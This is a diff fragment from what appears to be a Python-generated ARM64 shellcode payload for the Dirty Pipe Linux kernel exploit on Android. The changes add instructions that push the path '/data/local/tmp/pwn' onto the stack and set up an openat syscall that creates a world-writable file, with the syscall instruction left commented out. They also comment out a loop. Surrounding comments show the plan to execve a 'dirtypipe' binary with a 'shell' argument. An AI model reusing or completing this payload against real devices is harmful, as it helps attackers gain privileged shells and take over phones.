@@ -104,12 +104,35 @@ def main():
     b.lt exit             // error
     b.gt exit             // parent process exits
 
+//loop:
+    //b loop
+
     // execve("/data/local/tmp/dirtypipe", ["dirtypipe", "shell"], NULL)
 
 //go:
+    {push_str_on_stack('/data/local/tmp/pwn')}
+    // Arguments for openat:
+    // int openat(int dirfd, const char *pathname, int flags, mode_t mode)
+    // x0 = dirfd (AT_FDCWD = -100)
+    // x1 = pathname (pointer)
+    // x2 = flags (O_CREAT | O_WRONLY)
+    // x3 = mode (0777)
 
-loop:
-    b loop
+    // x0: AT_FDCWD (-100 is 0xffffffffffffff9c)
+    mov x0, -100
+
+    // x1: pointer to filename
+    mov x1, sp
+
+    // x2: O_CREAT | O_WRONLY = 0x0401
+    mov x2, #0x401
+
+    // x3: mode = 0o777 (octal) = 0x1FF
+    mov x3, #0x1FF
+
+    // x8: syscall number for openat (56)
+    mov x8, #56
+    //svc #0
 
     {push_str_on_stack('/data/local/tmp/dirtypipe')}
     mov x6, sp
